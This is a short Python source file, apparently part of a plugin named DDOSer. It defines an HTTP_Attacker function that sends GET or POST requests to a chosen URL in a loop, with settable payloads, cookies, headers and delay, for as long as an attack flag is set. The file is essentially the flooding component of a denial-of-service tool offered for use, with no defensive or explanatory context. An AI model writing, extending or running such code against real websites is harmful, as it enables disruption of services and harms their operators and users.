# libs
from lib.GPL.HTTP_Managers import gpl_http_get, gpl_http_post
import plugins.DDOSer.Status_Holders as Holders
from lib.GPL.IO import gpl_sleep

# Attacker
def HTTP_Attacker(URL, Method, SleepTime, Payload={}, Cookies={}, Headers={'User-Agent': 'Unknown'}):
    try:
        if Method == 'Post':
            while Holders.In_Attack:
                gpl_http_post(URL, payload=Payload, headers=Headers, cookies=Cookies)
                gpl_sleep(SleepTime)
        else:
            while Holders.In_Attack:
                gpl_http_get(URL, params=Payload, headers=Headers, cookies=Cookies)
                gpl_sleep(SleepTime)
    except (EOFError, KeyboardInterrupt):
        pass